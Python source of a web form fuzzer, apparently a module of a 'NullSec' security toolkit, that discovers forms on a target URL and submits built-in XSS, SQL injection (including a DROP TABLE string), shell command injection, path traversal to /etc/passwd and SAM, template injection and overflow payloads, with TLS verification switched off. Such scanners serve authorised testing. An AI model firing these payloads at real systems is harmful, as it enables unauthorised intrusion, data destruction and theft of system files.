"""
NullSec Framework — Form Fuzzer Module
Automated form discovery and parameter fuzzing for web applications.
"""

import re
import ssl
import json
import socket
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse, urlencode
from datetime import datetime
from typing import Dict, List, Tuple

try:
    from modules import BaseModule
except ImportError:
    from __init__ import BaseModule


class FormFuzzer(BaseModule):
    name = "formfuzz"
    description = "Web form discovery and input fuzzing with injection payload testing"
    category = "web"
    version = "1.0.0"

    # Fuzz payloads by category
    PAYLOADS = {
        "xss": [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)",
            "'><svg/onload=alert(1)>",
            "<img src=x onerror=prompt(1)>",
            "{{7*7}}",
            "${7*7}",
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "1' AND '1'='1",
            "'; DROP TABLE users--",
            "1 UNION SELECT NULL--",
            "' AND 1=1--",
        ],
        "command": [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "& ping -c 1 127.0.0.1 &",
            "; echo nullsec_test",
        ],
        "path": [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd%00",
            "....//....//....//etc/passwd",
            "file:///etc/passwd",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ],
        "overflow": [
            "A" * 256,
            "A" * 1024,
            "A" * 4096,
            "%n" * 20,
            "%s" * 20,
        ],
    }

    # Response indicators for vulnerability detection
    INDICATORS = {
        "xss_reflected": [r"<script>alert\(1\)</script>", r"onerror=alert\(1\)"],
        "sqli_error": [r"SQL syntax", r"mysql_", r"ORA-\d+", r"PostgreSQL.*ERROR"],
        "command_exec": [r"root:.*:0:0:", r"uid=\d+", r"nullsec_test"],
        "path_traversal": [r"root:.*:0:0:", r"\[boot loader\]"],
        "ssti": [r"\b49\b", r"<class"],
    }

    def validate(self) -> bool:
        url = self.get_option("url")
        if not url:
            print("[!] Target URL is required")
            return False
        return True

    def run(self, **kwargs) -> Dict:
        url = self.get_option("url", kwargs.get("url", ""))
        timeout = int(self.get_option("timeout", kwargs.get("timeout", 10)))
        categories = self.get_option("categories", kwargs.get("categories", "xss,sqli"))
        fuzz_all = self.get_option("fuzz_all", kwargs.get("fuzz_all", False))

        print(f"[*] Form Fuzzer: {url}")

        result = {
            "url": url,
            "timestamp": datetime.utcnow().isoformat(),
            "forms": [],
            "vulnerabilities": [],
        }

        # Fetch page and discover forms
        body = self._fetch(url, timeout)
        if not body:
            result["error"] = "Failed to fetch page"
            return result

        forms = self._discover_forms(body, url)
        result["forms"] = [{"action": f[0], "method": f[1], "fields": f[2]} for f in forms]
        print(f"  [+] Forms discovered: {len(forms)}")

        if not forms:
            print("  [!] No forms found on page")
            return result

        # Select payload categories
        if fuzz_all:
            cats = list(self.PAYLOADS.keys())
        else:
            cats = [c.strip() for c in categories.split(",")]

        total_payloads = sum(len(self.PAYLOADS.get(c, [])) for c in cats)
        print(f"  [+] Categories: {', '.join(cats)} ({total_payloads} payloads)")

        # Fuzz each form
        for i, (action, method, fields) in enumerate(forms):
            print(f"\n  [*] Form #{i+1}: {method.upper()} {action}")
            print(f"      Fields: {', '.join(fields)}")

            # Get baseline response
            baseline_data = {f: "test" for f in fields}
            baseline = self._submit_form(action, method, baseline_data, timeout)
            baseline_len = len(baseline) if baseline else 0

            # Fuzz each field
            for field in fields:
                for cat in cats:
                    payloads = self.PAYLOADS.get(cat, [])
                    for payload in payloads:
                        fuzz_data = {f: "test" for f in fields}
                        fuzz_data[field] = payload

                        response = self._submit_form(action, method, fuzz_data, timeout)
                        if not response:
                            continue

                        # Check for vulnerability indicators
                        vuln = self._check_response(response, cat, payload, baseline_len)
                        if vuln:
                            entry = {
                                "form": action,
                                "method": method,
                                "field": field,
                                "category": cat,
                                "payload": payload,
                                "indicator": vuln,
                            }
                            result["vulnerabilities"].append(entry)
                            print(f"    [!] {cat.upper()} in '{field}': {vuln}")

        # Summary
        total = len(result["vulnerabilities"])
        print(f"\n[*] Fuzzing complete: {total} potential vulnerabilities")

        by_cat = {}
        for v in result["vulnerabilities"]:
            by_cat.setdefault(v["category"], 0)
            by_cat[v["category"]] += 1
        for cat, count in by_cat.items():
            print(f"    {cat}: {count}")

        return result

    def _fetch(self, url, timeout):
        """Fetch page content."""
        try:
            req = Request(url, headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) NullSec/1.0",
            })
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = urlopen(req, timeout=timeout, context=ctx)
            return resp.read().decode("utf-8", errors="replace")
        except (HTTPError, URLError, socket.timeout, OSError):
            return None

    def _discover_forms(self, html, base_url) -> List[Tuple]:
        """Discover HTML forms and their fields."""
        forms = []
        parsed_base = urlparse(base_url)

        for form_match in re.finditer(r'<form\s+([^>]*)>(.*?)</form>', html, re.I | re.S):
            attrs = form_match.group(1)
            form_body = form_match.group(2)

            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            action = action_match.group(1) if action_match else base_url
            if action.startswith("/"):
                action = f"{parsed_base.scheme}://{parsed_base.netloc}{action}"
            elif not action.startswith("http"):
                action = f"{base_url.rstrip('/')}/{action}"

            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            method = method_match.group(1).lower() if method_match else "get"

            # Extract input fields
            fields = []
            for input_match in re.finditer(r'<input\s+([^>]*)/?>', form_body, re.I):
                input_attrs = input_match.group(1)
                name_match = re.search(r'name=["\']([^"\']*)["\']', input_attrs, re.I)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_attrs, re.I)
                if name_match:
                    input_type = type_match.group(1).lower() if type_match else "text"
                    if input_type not in ("submit", "button", "image", "hidden"):
                        fields.append(name_match.group(1))

            # Also check textarea and select
            for tag in re.finditer(r'<(?:textarea|select)\s+[^>]*name=["\']([^"\']*)["\']', form_body, re.I):
                fields.append(tag.group(1))

            if fields:
                forms.append((action, method, fields))

        return forms

    def _submit_form(self, action, method, data, timeout):
        """Submit form data and return response."""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            if method == "get":
                url = f"{action}?{urlencode(data)}"
                req = Request(url, headers={
                    "User-Agent": "Mozilla/5.0 NullSec/1.0",
                })
            else:
                encoded = urlencode(data).encode()
                req = Request(action, data=encoded, headers={
                    "User-Agent": "Mozilla/5.0 NullSec/1.0",
                    "Content-Type": "application/x-www-form-urlencoded",
                })

            resp = urlopen(req, timeout=timeout, context=ctx)
            return resp.read().decode("utf-8", errors="replace")
        except HTTPError as e:
            try:
                return e.read().decode("utf-8", errors="replace")
            except Exception:
                return ""
        except (URLError, socket.timeout, OSError):
            return None

    def _check_response(self, response, category, payload, baseline_len):
        """Check response for vulnerability indicators."""
        # Check for reflected content (XSS)
        if category == "xss" and payload in response:
            return "payload reflected in response"

        # Check regex indicators
        indicator_key = {
            "xss": "xss_reflected",
            "sqli": "sqli_error",
            "command": "command_exec",
            "path": "path_traversal",
            "ssti": "ssti",
        }.get(category)

        if indicator_key and indicator_key in self.INDICATORS:
            for pattern in self.INDICATORS[indicator_key]:
                if re.search(pattern, response, re.I):
                    return f"pattern match: {pattern}"

        # Check for significant response size change
        resp_len = len(response)
        if baseline_len > 0:
            diff = abs(resp_len - baseline_len) / baseline_len
            if diff > 0.5 and resp_len > baseline_len:
                return f"significant response size change ({diff:.0%})"

        return None


if __name__ == "__main__":
    import sys
    fuzzer = FormFuzzer()
    url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
    fuzzer.set_option("url", url)
    result = fuzzer.execute()
    print(json.dumps(result, indent=2, default=str))
